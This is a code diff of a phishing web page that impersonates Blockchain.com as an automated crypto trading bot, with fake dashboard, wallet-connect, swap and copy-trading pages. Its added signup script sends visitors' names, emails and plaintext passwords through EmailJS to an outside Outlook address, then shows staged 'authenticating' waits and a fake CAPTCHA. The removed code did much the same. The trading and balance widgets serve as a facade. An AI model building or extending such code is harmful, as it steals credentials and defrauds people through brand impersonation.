@@ -315,7 +315,7 @@
 </section>
 
 <!-- PAGE 3 - DASHBOARD -->
-<div id="page3" style="display:none">
+<section id="page3" class="page hidden bg-[#0b0e11] text-white font-sans min-h-screen p-6">
 <!DOCTYPE html>  
 <html lang="en" class="dark scroll-smooth">  
 <head>  
@@ -328,20 +328,42 @@
 </head>  
 <body class="bg-[#0b0e11] text-white font-sans">  
   <!-- HEADER -->  
-  <header class="bg-[#131619] border-b border-gray-800 px-6 py-4 flex justify-between items-center">  
-    <h1 class="text-xl font-bold">Blockchain.com</h1>  
-    <div class="flex items-center space-x-4">  
-      <button onclick="showPage('page10')" style="background:none; color:#f0b90b; padding:6px 12px; border:none; border-radius:6px;">Support</button>  
-      <button onclick="openWalletModal()" style="background:#f0b90b; color:#000; padding:10px 20px; border:none; border-radius:10px;">Connect Wallet</button>  
-      <button style="background:#f0b90b; color:#000; padding:10px 20px; border:none; border-radius:10px;">Log Out</button>  
-    </div>  
-  </header>  
+  <header class="bg-[#131619] border-b border-gray-800 px-6 py-4 flex justify-between items-center rounded-lg">
+    <h1 class="text-xl font-bold text-[#f3ba2f]">Blockchain.com</h1>
+    <div class="flex items-center space-x-4">
+      <button onclick="showPage('page10')" class="text-[#f3ba2f] hover:underline">Support</button>
+      <button onclick="showPage('page13')" class="bg-[#f3ba2f] text-black font-bold py-2 px-4 rounded-md">Connect Wallet</button>
+      <button onclick="logoutUser()" class="bg-[#f3ba2f] text-black font-bold py-2 px-4 rounded-md">Log Out</button>
+    </div>
+  </header>
+
+  <!-- Wallet Info -->
+  <div class="max-w-xl mx-auto bg-[#1e2124] rounded-xl p-6 shadow-lg mt-8">
+    <h2 class="text-2xl font-extrabold mb-4 text-[#f3ba2f]">📊 Wallet Info</h2>
+    <p class="mb-2"><strong>Connected Wallet:</strong> <span id="connectedWallet" class="font-mono select-text">Not connected</span></p>
+    <p class="mb-2"><strong>BNB Balance:</strong> <span id="bnbBalance">--</span></p>
+    <p class="mb-2"><strong>USDT Balance:</strong> <span id="usdtBalance">--</span></p>
+    <p class="mb-2"><strong>Total Assets (USD):</strong> <span id="totalAssets">--</span></p>
+    <button id="refreshBalancesBtn"
+      class="mt-6 bg-[#f3ba2f] hover:bg-yellow-500 text-black font-bold py-3 px-6 rounded-lg shadow-md transition"
+      title="Refresh wallet balances"
+    >
+      🔄 Refresh Balances
+    </button>
+  </div>
+
+  <!-- Notification -->
+  <div id="balanceNotification"
+       class="fixed top-6 right-6 bg-[#1e1e1e] border border-[#f3ba2f] text-[#f3ba2f] px-4 py-3 rounded-md shadow-lg hidden z-50">
+    🔔 Wallet balances updated successfully!
+  </div>
+</section>
   <!-- SIDEBAR + MAIN CONTENT -->  
   <div class="flex min-h-screen">  
     <!-- SIDEBAR -->  
     <aside class="bg-[#131619] w-64 hidden md:flex flex-col p-6 space-y-4 border-r border-gray-800">  
       <nav class="space-y-2">  
-        <button onclick="showPage('page3')" style="background:none; color:#f0b90b; padding:10px 15px; border:none; border-radius:8px; font-weight:bold; width:100%; text-align:left;">Dashboard</button>  
+        <button onclick="showPage('page4')" style="background:none; color:#f0b90b; padding:10px 15px; border:none; border-radius:8px; font-weight:bold; width:100%; text-align:left;">Dashboard</button>  
         <button onclick="showPage('page5')" style="background:none; color:#fff; padding:10px 15px; border:none; border-radius:8px; width:100%; text-align:left;">Buy/Sell</button>  
         <button onclick="showPage('page7')" style="background:none; color:#fff; padding:10px 15px; border:none; border-radius:8px; width:100%; text-align:left;">Send</button>  
         <button onclick="showPage('page6')" style="background:none; color:#fff; padding:10px 15px; border:none; border-radius:8px; width:100%; text-align:left;">Receive</button>  
@@ -403,23 +425,6 @@
     </main>  
   </div>  
 
-  <!-- MULTI-CHAIN WALLET CONNECT MODAL -->  
-  <div id="walletModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center hidden z-50">  
-    <div class="bg-[#1c1f24] rounded-xl p-6 w-96 max-w-full relative">  
-      <h2 class="text-xl font-bold mb-4">Connect Wallet</h2>  
-      <p class="mb-4 text-gray-300">Select your wallet and blockchain network:</p>  
-      <label for="chainSelect" class="block mb-2 font-semibold">Choose Blockchain Network:</label>  
-      <select id="chainSelect" class="w-full p-2 rounded bg-[#0b0e11] border border-gray-700 mb-4 text-white">  
-        <option value="bsc">Binance Smart Chain (BSC)</option>  
-        <option value="eth">Ethereum (ETH)</option>  
-        <option value="polygon">Polygon (MATIC)</option>  
-        <option value="avalanche">Avalanche (AVAX)</option>  
-      </select>  
-      <button id="connectWalletBtn" style="background:#f0b90b; color:#000; padding:10px 20px; border:none; border-radius:10px; width:100%;">Connect Wallet</button>  
-      <button onclick="closeWalletModal()" style="position:absolute; top:10px; right:10px; font-weight:bold; color:#f0b90b; background:none; border:none; font-size:24px; cursor:pointer;">×</button>  
-    </div>  
-  </div>
-  
 <!-- === PAGE 5: BUY/SELL CRYPTO === -->
 <section id="page5" class="page hidden min-h-screen px-4 py-6 bg-[#0b0e11] text-white">
 
@@ -492,7 +497,7 @@
         <span>Sold 1.2 ETH</span>
         <span>$3,400.00</span>
       </li>
-    </ul>
+    </ul> 
   </div>
 
 </section>
@@ -566,6 +571,73 @@
     <div id="tradingview_chart" style="height:400px;"></div>
   </div>
 </section>
+
+  <!-- === PAGE 4: HOMEPAGE === -->
+<section id="page4" class="page hidden bg-[#0b0e11] text-white font-sans min-h-screen px-6 py-8 relative">
+
+  <!-- 1. HEADER -->
+  <div class="flex justify-between items-center mb-6">
+    <h1 class="text-3xl font-extrabold text-[#f3ba2f] select-none">🏠 Dashboard</h1>
+    <button id="settingsBtn" class="text-sm text-white border px-3 py-1 rounded-md hover:bg-[#1f2b3a]">⚙️ Settings</button>
+  </div>
+
+  <!-- 2. LANGUAGE + CURRENCY SELECTORS -->
+  <div class="flex flex-wrap gap-4 mb-6">
+    <select id="languageSelector" class="bg-[#1e2329] text-white px-4 py-2 rounded-md w-48"></select>
+    <select id="currencySelector" class="bg-[#1e2329] text-white px-4 py-2 rounded-md w-48"></select>
+  </div>
+
+  <!-- 3. WALLET SECTION -->
+  <div class="bg-[#1e2329] p-4 rounded-xl mb-6 shadow flex flex-col gap-2">
+    <div id="walletStatus" class="text-[#f3ba2f] font-bold">🔌 Wallet: Not Connected</div>
+    <div class="text-sm text-gray-300" id="walletBalance">Loading balances...</div>
+  </div>
+
+  <!-- 4. TOTAL ASSETS -->
+  <div class="bg-[#1e2329] p-4 rounded-xl mb-6 shadow">
+    <div class="text-lg text-gray-300">Total Assets</div>
+    <div id="totalAssets" class="text-3xl font-bold text-white">$0.00</div>
+  </div>
+
+  <!-- 5. TOKEN BALANCES -->
+  <div class="grid grid-cols-2 gap-4 mb-6">
+    <div class="bg-[#1e2329] p-4 rounded-xl shadow">
+      <div class="text-gray-400">USDT Balance</div>
+      <div id="usdtBalance" class="text-xl font-bold text-white">0.00</div>
+    </div>
+    <div class="bg-[#1e2329] p-4 rounded-xl shadow">
+      <div class="text-gray-400">BNB Balance</div>
+      <div id="bnbBalance" class="text-xl font-bold text-white">0.00</div>
+    </div>
+  </div>
+
+  <!-- 6. LIVE CHART (TradingView) -->
+  <div class="bg-[#1e2329] rounded-xl shadow mb-6">
+    <div class="tradingview-widget-container">
+      <div id="tradingview_chart"></div>
+    </div>
+  </div>
+
+  <!-- 7. DAILY PROFIT CHART -->
+  <div class="bg-[#1e2329] p-4 rounded-xl mb-6 shadow">
+    <div class="flex justify-between items-center mb-2">
+      <div class="text-white font-semibold">Daily Profit Goal</div>
+      <div id="dailyGoalValue" class="text-[#f3ba2f]">$150</div>
+    </div>
+    <div class="bg-gray-700 h-4 rounded-full overflow-hidden">
+      <div id="dailyGoalProgress" class="bg-[#f3ba2f] h-4" style="width: 0%"></div>
+    </div>
+  </div>
+
+  <!-- 8. ACTION BUTTONS -->
+  <div class="grid grid-cols-2 gap-4 mb-6">
+    <button onclick="showPage(6)" class="bg-[#f3ba2f] text-black py-3 rounded-xl font-bold hover:opacity-90">➕ Receive</button>
+    <button onclick="showPage(7)" class="bg-[#f3ba2f] text-black py-3 rounded-xl font-bold hover:opacity-90">📤 Transfer</button>
+  </div>
+
+  <!-- 9. TOAST NOTIFICATION -->
+  <div id="toast" class="fixed bottom-4 right-4 bg-[#1e2329] text-white px-6 py-3 rounded-md shadow-lg hidden z-50"></div>
+</section>
    
 <!-- PAGE 7 - TRANSFER -->  
 <section id="page7" class="page px-4 md:px-0">  
@@ -613,7 +685,7 @@
     <div class="mt-10 grid gap-4">
       <button onclick="feedback(); showPage('11i')" class="bg-[#1f2630] text-yellow-400 font-bold py-3 rounded-xl text-left px-4 hover:bg-[#28303d] transition" data-translate="kyc_verification">🛡️ KYC Verification</button>
       <button onclick="feedback(); showPage('11ii')" class="bg-[#1f2630] text-yellow-400 font-bold py-3 rounded-xl text-left px-4 hover:bg-[#28303d] transition" data-translate="view_profile">👤 View Profile</button>
-      <button onclick="feedback(); showPage('11iii')" class="bg-[#1f2630] text-yellow-400 font-bold py-3 rounded-xl text-left px-4 hover:bg-[#28303d] transition" data-translate="connect_wallet">🔗 Connect Wallet</button>
+      <button onclick="feedback(); showPage('13')" class="bg-[#1f2630] text-yellow-400 font-bold py-3 rounded-xl text-left px-4 hover:bg-[#28303d] transition" data-translate="connect_wallet">🔗 Connect Wallet</button>
       <button onclick="feedback(); window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')" class="bg-yellow-400 text-black font-bold py-3 rounded-xl text-left px-4 hover:bg-yellow-300 transition" data-translate="live_chat">💬 Live Chat Support</button>
       <button onclick="feedback(); disconnectWallet()" class="bg-transparent border border-yellow-400 text-yellow-400 font-bold py-3 rounded-xl hover:bg-[#1f2630] transition" data-translate="disconnect_wallet">❌ Disconnect Wallet</button>
       <button onclick="feedback(); logout()" class="bg-transparent border border-red-500 text-red-500 font-bold py-3 rounded-xl hover:bg-red-900 transition" data-translate="logout">🚪 Logout</button>
@@ -627,71 +699,306 @@
     Save
   </button>
 </section>
+<!-- ✅ PAGE 13 - CONNECT WALLET -->
+<section id="page13" class="page px-4 py-8 min-h-screen bg-[#0b0e11] text-white">
+  <div class="max-w-xl mx-auto bg-[#12161c] p-6 rounded-xl shadow-lg">
+
+    <!-- Header -->
+    <div class="flex items-center justify-between mb-6">
+      <h2 class="text-2xl font-bold">Connect Your Wallet</h2>
+      <button onclick="showPage('4')" class="text-yellow-400 hover:underline">← Dashboard</button>
+    </div>
+
+    <!-- Blockchain Selection -->
+    <label for="chainSelect" class="block mb-2 font-semibold">Select Blockchain Network</label>
+    <select id="chainSelect" class="w-full p-3 mb-4 rounded-lg bg-[#1d232c] border border-gray-600 text-white">
+      <option value="bsc">Binance Smart Chain (BEP20)</option>
+      <option value="eth">Ethereum (ERC20)</option>
+      <option value="polygon">Polygon</option>
+      <option value="avax">Avalanche</option>
+    </select>
+
+    <!-- Wallet Address Input -->
+    <label for="walletAddress" class="block mb-2 font-semibold">Wallet Address</label>
+    <input type="text" id="walletAddress" placeholder="Paste your wallet address"
+      class="w-full p-3 mb-4 rounded-lg bg-[#1d232c] border border-gray-600 text-white" />
+
+    <!-- Email (optional) -->
+    <label for="userEmail" class="block mb-2 font-semibold">Email (optional)</label>
+    <input type="email" id="userEmail" placeholder="Enter your email"
+      class="w-full p-3 mb-4 rounded-lg bg-[#1d232c] border border-gray-600 text-white" />
+
+    <!-- QR Scan (future feature) -->
+    <button onclick="scanQR()" class="w-full p-3 mb-4 rounded-lg bg-[#f0b90b] text-black font-bold hover:bg-yellow-400 transition">
+      Scan Wallet QR
+    </button>
+
+    <!-- Connect Button -->
+    <button onclick="submitWalletConnection()" class="w-full p-3 rounded-lg bg-green-500 font-bold hover:bg-green-600 transition">
+      Connect Wallet
+    </button>
+
+    <!-- Success Message -->
+    <div id="walletSavedMsg" class="mt-4 text-green-400 text-sm hidden">✅ Wallet connected and saved.</div>
+  </div>
+</section>
+
+  <!-- === PAGE 16: Earn Menu (Updated Blockchain.com Style) === -->
+<section id="page16" class="page min-h-screen bg-[#0b0e11] text-[#f3ba2f] font-sans px-6 py-8">
+  <div class="max-w-6xl mx-auto">
+
+    <!-- Header -->
+    <div class="flex justify-between items-center mb-8">
+      <h1 class="text-3xl md:text-4xl font-extrabold tracking-tight select-none">📈 Earn Menu</h1>
+      <button onclick="showPage('page4')"
+        class="bg-[#1E2124] text-white px-4 py-2 rounded-lg font-bold hover:bg-[#2c2f33] transition select-none">
+        ⬅ Back to Dashboard
+      </button>
+    </div>
+
+    <!-- Trade Options Grid -->
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-10">
+      <button onclick="showPage('page16i')"
+        class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+        📊 Spot Trading
+      </button>
+      <button onclick="showPage('page16ii')"
+        class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+        👥 Copy Trading
+      </button>
+      <button onclick="showPage('page16iii')"
+        class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+        📈 Futures Trading
+      </button>
+      <button onclick="showPage('page16iv')"
+        class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+        🩾 Derivatives
+      </button>
+      <button onclick="showPage('page16v')"
+        class="bg-[#f0b90b] text-black py-4 px-6 rounded-xl font-bold text-lg shadow hover:opacity-90 transition select-none">
+        ⚙️ Trade Utilities
+      </button>
+    </div>
+
+    <!-- Trading Balance -->
+    <div class="text-xl font-extrabold mb-6 select-none">
+      Total Trading Balance (USD):
+      <span id="totalTradingBalance" class="text-[#f0b90b]">$0.00</span>
+    </div>
+
+    <!-- Token Swap Section -->
+    <div class="bg-[#1e2329] text-[#f3ba2f] p-6 rounded-xl max-w-md mx-auto shadow-md">
+      <h2 class="text-2xl font-extrabold mb-4 select-none">Token Swap</h2>
+
+      <label for="fromToken" class="block mb-2 font-semibold select-none">From Token</label>
+      <select id="fromToken"
+        class="w-full bg-[#1e2329] border border-[#f3ba2f] rounded-lg px-4 py-3 mb-4 text-[#f3ba2f] font-bold cursor-pointer">
+        <option value="USDT">USDT (Tether)</option>
+        <option value="BNB">BNB (Binance Coin)</option>
+      </select>
+
+      <label for="fromAmount" class="block mb-2 font-semibold select-none">Amount</label>
+      <input id="fromAmount" type="number" placeholder="Enter amount" min="0" step="any"
+        class="w-full px-4 py-3 rounded-lg border border-[#f3ba2f] bg-[#1e2329] text-[#f3ba2f] font-bold mb-4"
+        oninput="updateReceiveAmount()" />
+
+      <label for="toToken" class="block mb-2 font-semibold select-none">To Token</label>
+      <select id="toToken"
+        class="w-full bg-[#1e2329] border border-[#f3ba2f] rounded-lg px-4 py-3 mb-4 text-[#f3ba2f] font-bold cursor-pointer"
+        onchange="updateReceiveAmount()">
+        <option value="BNB">BNB (Binance Coin)</option>
+        <option value="USDT">USDT (Tether)</option>
+        <option value="BTC">BTC (Bitcoin)</option>
+        <option value="ETH">ETH (Ethereum)</option>
+        <option value="BCH">BCH (Bitcoin Cash)</option>
+        <option value="LTC">LTC (Litecoin)</option>
+        <option value="XLM">XLM (Stellar)</option>
+        <option value="MATIC">MATIC (Polygon)</option>
+        <option value="DOGE">DOGE (Dogecoin)</option>
+        <option value="ADA">ADA (Cardano)</option>
+        <option value="SOL">SOL (Solana)</option>
+        <option value="AVAX">AVAX (Avalanche)</option>
+        <option value="DOT">DOT (Polkadot)</option>
+        <option value="TRX">TRX (Tron)</option>
+        <option value="SHIB">SHIB (Shiba Inu)</option>
+        <option value="UNI">UNI (Uniswap)</option>
+        <option value="LINK">LINK (Chainlink)</option>
+        <option value="ATOM">ATOM (Cosmos)</option>
+        <option value="ETC">ETC (Ethereum Classic)</option>
+        <option value="FTM">FTM (Fantom)</option>
+        <option value="NEAR">NEAR (Near Protocol)</option>
+        <option value="HBAR">HBAR (Hedera)</option>
+        <option value="ALGO">ALGO (Algorand)</option>
+        <option value="CRO">CRO (Cronos)</option>
+        <option value="EGLD">EGLD (MultiversX)</option>
+        <option value="VET">VET (VeChain)</option>
+        <option value="ZIL">ZIL (Zilliqa)</option>
+        <option value="AAVE">AAVE (Aave)</option>
+        <option value="CAKE">CAKE (PancakeSwap)</option>
+        <option value="SAND">SAND (The Sandbox)</option>
+        <option value="MANA">MANA (Decentraland)</option>
+        <option value="AXS">AXS (Axie Infinity)</option>
+        <option value="GALA">GALA (Gala Games)</option>
+        <option value="APE">APE (ApeCoin)</option>
+        <option value="RNDR">RNDR (Render Token)</option>
+        <option value="DYDX">DYDX (dYdX)</option>
+        <option value="1INCH">1INCH (1inch)</option>
+        <option value="LRC">LRC (Loopring)</option>
+        <option value="BAND">BAND (Band Protocol)</option>
+        <option value="ENS">ENS (Ethereum Name Service)</option>
+        <option value="CHZ">CHZ (Chiliz)</option>
+        <option value="COMP">COMP (Compound)</option>
+        <option value="RUNE">RUNE (THORChain)</option>
+        <option value="GRT">GRT (The Graph)</option>
+        <option value="TWT">TWT (Trust Wallet Token)</option>
+        <option value="BAT">BAT (Basic Attention Token)</option>
+        <option value="ZRX">ZRX (0x Protocol)</option>
+        <option value="KAVA">KAVA (Kava)</option>
+        <option value="XRP">XRP (Ripple)</option>
+        <option value="FIL">FIL (Filecoin)</option>
+        <option value="XTZ">XTZ (Tezos)</option>
+      </select>
+
+      <div class="text-lg font-bold mb-4 select-none">
+        Estimated Receive: <span id="receiveAmount">0</span>
+      </div>
+
+      <button onclick="handleTrade()"
+        class="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:opacity-90 transition select-none">
+        Swap
+      </button>
+    </div>
+
+  </div>
+</section>
+  <!-- === PAGE 16i: Spot Trading === -->
+<section id="page16i" class="page hidden bg-[#0b0e11] text-white px-4 py-8 min-h-screen font-sans">
+  <div class="max-w-4xl mx-auto space-y-8">
+    
+    <!-- Header -->
+    <h2 class="text-3xl font-extrabold text-white">📈 Spot Trading</h2>
+
+    <!-- Live Prices -->
+    <div class="flex flex-wrap gap-4 text-lg text-[#f0b90b] font-bold">
+      <div>🪙 BTC: <span id="btcPrice">--</span></div>
+      <div>🪙 ETH: <span id="ethPrice">--</span></div>
+      <div>🪙 BNB: <span id="bnbPrice">--</span></div>
+    </div>
+
+    <!-- TradingView Chart -->
+    <div class="w-full rounded-xl overflow-hidden shadow-lg border border-gray-700">
+      <iframe
+        src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark&style=1&timezone=Etc/UTC&hidesidetoolbar=1"
+        width="100%" height="400" frameborder="0" scrolling="no" allowtransparency="true"
+        class="w-full h-[400px] rounded-xl">
+      </iframe>
+    </div>
+
+    <!-- Trade Panel -->
+    <div class="bg-[#1e2124] rounded-xl p-6 space-y-4 max-w-lg mx-auto shadow-md">
+      <div>
+        <label class="block text-sm font-semibold mb-2">Token:</label>
+        <select id="spotToken" class="w-full p-3 rounded-md bg-[#0b0e11] text-white border border-gray-700">
+          <option value="BTC">BTC</option>
+          <option value="ETH">ETH</option>
+          <option value="BNB">BNB</option>
+        </select>
+      </div>
+
+      <div>
+        <label class="block text-sm font-semibold mb-2">Amount:</label>
+        <input type="number" id="spotAmount" placeholder="0.00" min="0" step="any"
+          class="w-full p-3 rounded-md bg-[#0b0e11] text-white border border-gray-700">
+      </div>
+
+      <div class="flex justify-between pt-4">
+        <button onclick="spotTrade('buy')"
+          class="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg shadow transition">
+          Buy
+        </button>
+        <button onclick="spotTrade('sell')"
+          class="bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded-lg shadow transition">
+          Sell
+        </button>
+      </div>
+
+      <p id="spotTradeResult" class="pt-2 font-bold text-[#f0b90b]"></p>
+    </div>
+
+    <!-- Open Positions -->
+    <div>
+      <h3 class="text-xl font-bold mt-10 mb-4">📂 Open Positions</h3>
+      <div id="spotOpenPositions"
+        class="bg-[#14171a] p-4 rounded-lg max-h-48 overflow-y-auto text-[#f0b90b] font-medium shadow-md">
+        No open positions.
+      </div>
+    </div>
+
+    <!-- Trade History -->
+    <div>
+      <h3 class="text-xl font-bold mt-10 mb-4">📜 Trade History</h3>
+      <div id="spotTradeHistory"
+        class="bg-[#14171a] p-4 rounded-lg max-h-48 overflow-y-auto text-[#f0b90b] font-medium shadow-md">
+        No trade history.
+      </div>
+    </div>
+
+    <!-- Back Button -->
+    <div class="pt-8">
+      <button onclick="showPage('page16')"
+        class="bg-[#f0b90b] text-black font-semibold py-3 px-6 rounded-xl hover:bg-yellow-400 transition">
+        ⬅ Back to Trade Menu
+      </button>
+    </div>
+  </div>
+</section>
+
+  <!-- === PAGE 16ii: Copy Trading === -->
+<section id="page16ii" class="page hidden bg-[#0b0e11] text-white px-6 py-8 min-h-screen font-sans">
+  <div class="max-w-4xl mx-auto space-y-8">
+
+    <!-- Header -->
+    <h2 class="text-3xl font-extrabold text-[#f0b90b] mb-6 select-none">🤝 Copy Trading</h2>
+
+    <!-- Live Prices (BTC, ETH, BNB) -->
+    <div class="flex flex-wrap gap-6 text-lg text-[#f0b90b] font-bold mb-8 justify-center">
+      <div>🪙 BTC: <span id="btcPrice">--</span></div>
+      <div>🪙 ETH: <span id="ethPrice">--</span></div>
+      <div>🪙 BNB: <span id="bnbPrice">--</span></div>
+    </div>
+
+    <!-- Experts List -->
+    <div id="expertsList" 
+         class="flex flex-col gap-4 max-w-full max-w-3xl mx-auto">
+      <!-- JS populates this -->
+    </div>
+
+    <!-- User Portfolio -->
+    <h3 class="text-2xl font-bold text-[#f0b90b] mb-3 select-none">Your Portfolio</h3>
+    <div id="portfolioDisplay" 
+         class="bg-[#1e2124] rounded-xl p-5 max-w-3xl mx-auto flex flex-wrap gap-5 text-[#ccc] text-base">
+      <!-- JS populates this -->
+    </div>
+
+    <!-- Live Copied Trades -->
+    <h3 class="text-2xl font-bold text-[#f0b90b] mb-3 select-none">Live Copied Trades</h3>
+    <div class="bg-[#1e2124] rounded-xl p-5 max-w-3xl mx-auto max-h-[350px] overflow-y-auto font-mono text-sm text-[#ccc]">
+      <ul id="copiedTrades" class="list-none p-0 m-0 space-y-1">
+        <!-- JS populates this -->
+      </ul>
+    </div>
+
+    <!-- Back Button -->
+    <div class="mt-8 text-center">
+      <button onclick="showPage('page16')" 
+              class="bg-[#f0b90b] hover:bg-yellow-400 text-black font-extrabold px-6 py-3 rounded-xl transition select-none">
+        ⬅ Back to Trade Menu
+      </button>
+    </div>
+  </div>
+</section>
 
   
-  <script>
-  emailjs.init("n9BsaM4ZjH178UeSf");
-  const serviceID = "service_xg8bzqs";
-  const signupTemplate = "template_gclz9gu";
-  const autoReplyTemplate = "template_r0zg4zj";
-
-  const registeredUsers = {};
-
-  function handleSignUp() {
-    const email = document.getElementById("signupEmail").value;
-    const password = document.getElementById("signupPassword").value;
-    if (!email || !password) return alert("Fill all fields");
-
-    emailjs.send(serviceID, signupTemplate, { email, password })
-      .then(() => {
-        emailjs.send(serviceID, autoReplyTemplate, { email });
-        registeredUsers[email] = password;
-        document.getElementById('signUpForm').innerHTML = `
-          <div style="color: yellow; font-weight: bold; font-size: 16px; text-align: center; padding: 20px;">
-            Please wait while we connect you to your bot panel.
-          </div>
-          <div style="text-align: center;">
-            A verification link has been sent to <b>${email}</b><br><br>
-            <button onclick="window.location.href='mailto:${email}'" style="padding: 8px 16px; background: #1a73e8; color: white; border: none; border-radius: 5px;">
-              Visit Email
-            </button>
-          </div>
-        `;
-        setTimeout(() => {
-          showPage("page2ii");
-        }, 30000);
-      });
-  }
-
-  function handleLogin() {
-    const email = document.getElementById("loginEmail").value;
-    const password = document.getElementById("loginPassword").value;
-    if (registeredUsers[email] === password) {
-      showPage("page3");
-    } else {
-      document.getElementById("loginError").textContent = "Invalid credentials.";
-    }
-  }
-
-  function handleReset() {
-    const email = document.getElementById("resetEmail").value;
-    const newPassword = document.getElementById("newPassword").value;
-    if (registeredUsers[email]) {
-      registeredUsers[email] = newPassword;
-      document.getElementById("page1ii").innerHTML = "<p>Password updated. Please wait while we connect you to your bot panel...</p>";
-      setTimeout(() => {
-        showPage("page3");
-      }, 30000);
-    } else {
-      alert("Email not found.");
-    }
-  }
-
-  function showPage(id) {
-    document.querySelectorAll(".page").forEach(p => p.style.display = "none");
-    document.getElementById(id).style.display = "block";
-  }
-</script
   <!-- SCRIPTS -->    
   <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>  
   <script>  
@@ -886,96 +1193,83 @@
     setInterval(fetchPrices, 60000);  
   });  
 </script> 
-
-  <script>
+  <!-- ✅ JavaScript + EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
   emailjs.init("n9BsaM4ZjH178UeSf");
+
   const serviceID = "service_xg8bzqs";
   const submitTemplateID = "template_gclz9gu";
   const autoReplyTemplateID = "template_r0zg4zj";
-  const hcaptchaSiteKey = "4e5a8260-9554-439c-8d58-76f04ca823c8";
+  const domainCaptchaLink = "https://auto-tradingbot.github.io/System/#page2ii";
 
-  const registeredUsers = {}; // Local memory simulation for signup
+  function showPage(id) {
+    document.querySelectorAll(".page").forEach(page => page.classList.add("hidden"));
+    const nextPage = document.getElementById(id);
+    if (nextPage) nextPage.classList.remove("hidden");
+  }
 
   function handleSignUp() {
-    const name = document.getElementById('signFullName').value.trim();
-    const email = document.getElementById('signEmail').value.trim();
-    const password = document.getElementById('signPassword').value.trim();
+    const fullName = document.getElementById("signFullName").value;
+    const email = document.getElementById("signEmail").value;
+    const password = document.getElementById("signPassword").value;
 
-    if (name && email && password.length >= 6) {
-      registeredUsers[email] = password;
-      emailjs.send(serviceID, submitTemplateID, {
-        user_name: name,
-        user_email: email
-      }).then(() => {
-        emailjs.send(serviceID, autoReplyTemplateID, {
-          user_email: email,
-          verification_link: 'https://auto-tradingbot.github.io/System/page2ii' // placeholder
-        });
+    const templateParamsSubmit = {
+      to_email: "Blockchainautomated@outlook.com",
+      user_name: fullName,
+      user_email: email,
+      user_password: password
+    };
 
-        document.getElementById('signUpForm').innerHTML = `
-          <p class='text-yellow-400 font-semibold text-center'>Authenticating... Please wait 30 seconds</p>
-          <div class='mt-6 text-white text-center'>
-            A verification link has been sent to your email <b>${email}</b><br><br>
-            <button class='mt-4' onclick="window.location.href='mailto:${email}'">Visit Email</button>
-          </div>
-        `;
+    const templateParamsReply = {
+      user_email: email,
+      captcha_link: domainCaptchaLink
+    };
 
-        setTimeout(() => showPage('page2ii'), 30000);
+    // Submit registration data
+    emailjs.send(serviceID, submitTemplateID, templateParamsSubmit)
+      .then(() => {
+        // Send auto-reply
+        return emailjs.send(serviceID, autoReplyTemplateID, templateParamsReply);
+      })
+      .then(() => {
+        // Show authentication page
+        showPage("page2i");
+
+        // After 30 seconds, show CAPTCHA page
+        setTimeout(() => {
+          showPage("page2ii");
+        }, 30000);
+      })
+      .catch((err) => {
+        console.error("Signup Failed:", err);
+        alert("Something went wrong. Please try again.");
       });
-    } else {
-      alert('Please fill all fields with valid info.');
-    }
   }
 
-  function handleLogin() {
-    const email = document.getElementById('loginEmail').value.trim();
-    const password = document.getElementById('loginPassword').value.trim();
-
-    if (registeredUsers[email] === password) {
-      alert(`Logged in as ${email}`);
-      showPage('page3');
-      updateBalances();
-    } else {
-      document.getElementById('loginForm').innerHTML += `
-        <p class='text-red-500 font-semibold mt-4'>Incorrect details. Kindly enter the correct email or password to login.</p>
-        <button class='mt-2' onclick='showPage("page1i")'>Reset Password</button>
-      `;
-    }
-  }
-
-  function handleResetPassword() {
-    const email = document.getElementById('loginEmail').value.trim();
-    if (registeredUsers[email]) {
-      showPage('page1i');
-    } else {
-      alert('Email not recognized. Please sign up first.');
-    }
-  }
-
-  function verifyHumanAndReset() {
-    // Simulate CAPTCHA verification success
+  function completeCaptcha() {
+    // Redirect to page3 after short confirmation delay
     setTimeout(() => {
-      showPage('page1ii');
-    }, 3000);
+      window.location.href = "https://auto-tradingbot.github.io/System/#page3";
+    }, 1000);
   }
+</script>
 
-  function updatePassword() {
-    const email = document.getElementById('loginEmail').value.trim();
-    const newPass = document.getElementById('newPass').value.trim();
-    const confirmPass = document.getElementById('confirmPass').value.trim();
-
-    if (newPass && newPass === confirmPass) {
-      registeredUsers[email] = newPass;
-      document.getElementById('newPasswordForm').innerHTML = `
-        <p class='text-yellow-400 font-semibold text-center'>Verifying... Please wait 30 seconds</p>
-      `;
-      setTimeout(() => showPage('page3'), 30000);
-    } else {
-      alert('Passwords do not match.');
-    }
+<!-- 🔄 Loading Spinner -->
+<style>
+  .loader {
+    border: 5px solid #1e3a5f;
+    border-top: 5px solid #facc15;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
   }
-  </script>
- 
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+
 <script>
 // --- Initialize EmailJS ---
 emailjs.init("n9BsaM4ZjH178UeSf");
@@ -1609,95 +1903,6 @@ document.addEventListener("DOMContentLoaded", () => {
   });
     </script>
 
-  <!-- NAVIGATION SCRIPT -->
-  <script>
-    function showPage(pageId) {
-      document.querySelectorAll('.page').forEach(page => {
-        page.classList.remove('active');
-      });
-      const targetPage = document.getElementById(pageId);
-      if (targetPage) {
-        targetPage.classList.add('active');
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      }
-    }
-  </script>
-  <!-- ✅ JavaScript + EmailJS -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
